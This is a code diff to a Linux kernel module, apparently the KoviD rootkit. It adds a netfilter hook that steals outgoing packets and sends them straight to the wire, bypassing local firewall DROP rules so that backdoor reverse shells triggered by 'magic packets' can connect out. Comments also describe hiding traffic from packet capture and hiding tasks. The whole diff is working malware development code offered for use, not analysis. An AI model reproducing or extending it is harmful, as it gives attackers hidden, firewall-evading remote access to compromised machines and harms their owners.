@@ -23,7 +23,9 @@
 
 static LIST_HEAD(iph_node);
 struct iph_node_t {
-    __be32 addr;
+    struct iphdr *iph;
+    struct tcphdr *tcph;
+    bool established;
     struct list_head list;
 };
 
@@ -139,8 +141,15 @@ static void _free_kfifo_items(void) {
 
 /** ops struct for the callback */
 static struct nf_hook_ops ops;
+static struct nf_hook_ops ops_fw;
+
 
 static inline bool *_is_task_running(void) {
+    static bool running = false;
+    return &running;
+}
+
+static inline bool *_is_task_fw_bypass_running(void) {
     static bool running = false;
     return &running;
 }
@@ -363,12 +372,14 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
     return ret;
 }
 
-static int _bd_add_new_iph(__be32 addr) {
+static int _bd_add_new_iph(struct iphdr *iph, struct tcphdr *tcph) {
     struct iph_node_t *ip = kcalloc(1,
             sizeof(struct iph_node_t) , GFP_KERNEL);
     if (!ip) goto error;
 
-    ip->addr = addr;
+    ip->iph = iph;
+    ip->tcph = tcph;
+    ip->established = false;
     list_add_tail(&ip->list, &iph_node);
     return 0;
 error:
@@ -376,29 +387,88 @@ error:
     return -ENOMEM;
 }
 
-bool kv_bd_search_iph(__be32 addr) {
+bool kv_bd_search_iph_source(__be32 saddr) {
     struct iph_node_t *node, *node_safe;
     list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
-        if (node->addr == addr) {
+        if (node->iph->saddr == saddr) {
             return true;
         }
     }
     return false;
 }
 
-void _bd_cleanup(void) {
+bool kv_bd_established(__be32 *daddr, int dport, bool established) {
+    bool rc = false;
+    struct iph_node_t *node, *node_safe;
+
+    list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
+        /**
+         * Stored saddr is done at the moment the magic packets are
+         * received by our pre-routing netfilter hook.
+         * The client sends a packet is special flags set and source address
+         * is the hint that says: connect to this address and port.
+         *
+         * That will trigger a local application, socat, nc, etc that will
+         * attempr to connect to that particular address:port. When that happens
+         * we'll hook those packets in our local out netfilter hook and check
+         * the matching here. Packets coming to local out filter will be destined
+         * to the same address:port set in pre-routing, but this time they are
+         * daddr:dport, hence the inverted check you see here.
+         */
+        if (node->iph->saddr == *daddr && htons(node->tcph->source) ==  dport) {
+            /**
+             * Make sure to mark established only once per-connection so
+             * they will not loose estate.
+             * This will make internal references to be kept until
+             * connections are closed by clients, when tasks will be unhidden, data
+             * freed and the reverse shell(s) killed.
+             */
+            if (!node->established) {
+                node->established = established;
+            }
+
+            rc = true;
+            break;
+        }
+    }
+    return rc;
+}
+
+/**
+ * Delete a particular address reference
+ */
+void kv_bd_cleanup_item(__be32 *saddr) {
+    struct iph_node_t *node, *node_safe;
+    list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
+        if (node->iph->saddr == *saddr) {
+            list_del(&node->list);
+            kfree(node);
+            node = NULL;
+            break;
+        }
+    }
+}
+
+/**
+ * Can be used in two distinct scenarios:
+ *  1 - to remove one single address node if force == false
+ *  2 - to clean up all otherwise
+ */
+void _bd_cleanup(bool force) {
     struct iph_node_t *node, *node_safe;
     list_for_each_entry_safe(node, node_safe, &iph_node, list) {
-        list_del(&node->list);
-        kfree(node);
-        node = NULL;
+        if (!node->established && force) {
+            list_del(&node->list);
+            kfree(node);
+            node = NULL;
+        }
     }
 }
 
 static int _bd_watchdog_iph(void *unused) {
     while(!kthread_should_stop()) {
         msleep(500);
-        _bd_cleanup();
+        _bd_cleanup(false);
     }
     do_exit(0);
 }
@@ -484,8 +554,7 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
                 _put_fifo(kf);
 
                 /* Make sure we won't show up in libcap */
-                _bd_add_new_iph(iph->saddr);
-                _bd_add_new_iph(iph->daddr);
+                _bd_add_new_iph(iph, tcph);
 
                 user = (struct nf_priv*)priv;
                 wake_up_process(user->task);
@@ -501,6 +570,60 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
     }
     return rc;
 }
+
+/**
+ * This a magic place.
+ * Let's suppose the target has a local netfiler rule similar to the following:
+ *
+ *  target     prot opt source               destination
+ *  DROP       tcp  --  anywhere             <    IP    >         tcp dpt:<port>
+ *
+ *  Q: How are we supposed to establish a reverse shell to IP:port?
+ *  A: By hijacking the netfilter stack: stealing the packet and calling okfn()
+ *
+ *  NF_STOLEN packets will not continue their route through the chain, hence technically
+ *  they will not be blocked but would go nowhere either, unless okfn() is used: to
+ *  send the packet out to the wire.
+ *
+ *  Part of the implementation is dedicated to internal backdoors management: keeping states,
+ *  data lifetime, synchronization and more.
+ *
+ */
+static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
+        const struct nf_hook_state *state) {
+    int rc = NF_ACCEPT;
+    struct iphdr *iph = (struct iphdr *)skb_network_header(skb);
+    switch (iph->protocol) {
+        case IPPROTO_TCP: {
+                struct tcphdr *tcph = (struct tcphdr *)skb_transport_header(skb);
+                int dstport = htons(tcph->dest);
+                /**
+                 * include/net/tcp_states.h
+                 * sk_state carries current connection state of the packet, at this point in time.
+                 * What I look for here are for TCP_ESTABLISHED packets that will tell me that, well,
+                 * the connection has been completed, therefore that indicates that I can keep the
+                 * state and addresses for this connection, that will likely flow from now on, until
+                 * the either endpoint is closed.
+                 *
+                 * The established state will only be recorded the first time it comes here and
+                 * are kept throughout backdoor's lifetime.
+                 * */
+                if (kv_bd_established(&iph->daddr,
+                            dstport, (skb->sk->sk_state == TCP_ESTABLISHED))) {
+                    /**
+                     * Kick this packet out to the wire yay!
+                     */
+                    state->okfn(state->net, state->sk, skb);
+                    rc = NF_STOLEN;
+                }
+            }
+            break;
+        default:
+            break;
+    }
+    return rc;
+}
+
 
 struct task_struct *kv_sock_start_sniff(const char *name) {
     bool *running = _is_task_running();
@@ -545,6 +668,27 @@ leave:
     return tsk;
 }
 
+bool kv_sock_start_fw_bypass(void) {
+    bool *running = _is_task_fw_bypass_running();
+
+    if (!*running) {
+        // Hook pre routing
+        ops_fw.hook = _sock_hook_nf_fw_bypass;
+        ops_fw.pf = PF_INET;
+        /* Packets generated by local applications that are leaving this host */
+        ops_fw.hooknum = NF_INET_LOCAL_OUT;
+        /* High priority in relation to other existent hooks */
+        ops_fw.priority = NF_IP_PRI_FIRST;
+
+        ops_fw.priv = NULL;
+        nf_register_net_hook(&init_net, &ops_fw);
+
+        *running = true;
+    }
+
+    return *running;
+}
+
 void kv_sock_stop_sniff(struct task_struct *tsk) {
     if (tsk) {
         bool *running = _is_task_running();
@@ -563,4 +707,21 @@ void kv_sock_stop_sniff(struct task_struct *tsk) {
 
     kfifo_free(&buffer);
     _unload_stat_ops();
+}
+
+void kv_sock_stop_fw_bypass(void) {
+    bool *running = _is_task_fw_bypass_running();
+    if (*running) {
+        *running = false;
+        nf_unregister_net_hook(&init_net, &ops_fw);
+    }
+
+    /**
+     * Established connections are kept in
+     * iph_node until one of them terminates, or
+     * KoviD is unloaded. Key here is to always make
+     * sure if one BD client exists, all remaining ones
+     * are kicked-out too.
+     */
+    _bd_cleanup(true);
 }
